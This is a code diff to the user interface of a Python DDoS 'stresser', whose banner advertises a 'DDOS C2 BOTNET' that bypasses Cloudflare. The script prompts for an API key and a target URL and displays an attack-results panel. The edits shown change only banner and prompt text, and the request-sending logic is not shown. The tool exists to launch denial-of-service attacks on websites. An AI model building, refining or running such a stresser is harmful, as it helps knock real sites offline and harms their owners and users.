@@ -24,7 +24,7 @@ def L():
 ⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
 ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     """, style="bold magenta"))
-    console.print(Panel.fit("DDOS C2 BOTNET DIZ FLYZE FULL BYPASS CLOUDFLARE", style="bold yellow", padding=(1,2)))
+    console.print(Panel.fit("DDOS C2 BOTNET DIZ FLYZE ONLY BYPASS CLOUDFLARE", style="bold yellow", padding=(1,2)))
 
 def NU(user_input):
     if not re.match(r'^https?://', user_input):
@@ -68,14 +68,14 @@ def SR(info):
     table.add_row("Status", "[bold green]SUCCESSFULY[/]")
     console.print(Panel.fit(
         table,
-        title="[bold yellow][ HASIL ATTACKING ]",
-        subtitle="[bold green][ TIME ATTACK ] : [ 60 SEC ]",
+        title="[bold yellow][ BOTNET C2 ]",
+        subtitle="[bold green][ C2 SUKSES ]",
         style="bold white"
     ))
 
 def main():
     L()
-    api_url = console.input("[bold white]╔═(api)Dizflyze Streser)\n╚═══➤ ")
+    api_url = console.input("[bold white]╔═(api)Dizflyze Apikey)\n╚═══➤ ")
     L()
     target_input = console.input("[bold white]╔═(link)Dizflyze Streser)\n╚═══➤ ")
     target = NU(target_input)
